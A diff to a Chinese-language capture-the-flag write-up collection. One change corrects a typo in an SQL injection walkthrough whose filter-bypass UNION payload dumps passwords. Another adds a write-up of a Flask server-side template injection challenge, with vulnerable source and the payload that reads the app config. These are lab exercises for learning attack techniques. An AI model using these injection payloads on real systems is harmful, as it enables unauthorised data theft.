@@ -1064,7 +1064,7 @@ fxck your flag!
 ```
 自从前几次网站被日，我对我的网站做了严格的过滤，你们这些黑客死心吧！！！
 ```
-看上去挺强。sqlmap测试后发现被出题人嘲讽了，看来要么写temper，要么手工注入。先测试一下关键字，发现大多是关键字被删除，我们使用`<>`来绕过（当然这里也能双写）：
+看上去挺强。sqlmap测试后发现被出题人嘲讽了，看来要么写tamper，要么手工注入。先测试一下关键字，发现大多是关键字被删除，我们使用`<>`来绕过（当然这里也能双写）：
 ```
 check.php?username=admin&password=1' uni<>on sel<>ect 1,2,3%23
 # 选择3位置显示
@@ -1083,3 +1083,37 @@ check.php?username=admin&password=1' uni<>on sel<>ect 1,2,group_concat(passwo<>r
 得到flag
 
 ----
+# [WesternCTF2018]shrine
+打开就是源码：
+```
+import flask
+import os
+
+app = flask.Flask(__name__)
+
+app.config['FLAG'] = os.environ.pop('FLAG')
+
+
+@app.route('/')
+def index():
+    return open(__file__).read()
+
+
+@app.route('/shrine/<path:shrine>')
+def shrine(shrine):
+
+    def safe_jinja(s):
+        s = s.replace('(', '').replace(')', '')
+        blacklist = ['config', 'self']
+        return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s
+
+    return flask.render_template_string(safe_jinja(shrine))
+
+
+if __name__ == '__main__':
+    app.run(debug=True)
+```
+发现是将flag放在了`flask`的`config`里面，并且在`render`的时候把`config`和`self`整成了`None`，看来是一个模板注入，目的是要我们换个方式查询`flask`的`config`。所以在[flask文档](https://dormousehole.readthedocs.io/en/latest/api.html#flask.Flask)里面找变量有包含`current_app`的，我们就可以读取`config`了。用burp跑一下类似`函数.__globals__`的payload，找到response中含有`current_app`的，最后我使用`{{url_for.__globals__['current_app'].config}}`  
+其实这里如果没有过滤config的话，就直接`{{config}}`获取，没有过滤`self`的话也可以通过`{{self.__dict__}}`，没有过滤括号的话，还能用base object通过os读取环境变量来获得  
+
+得到flag
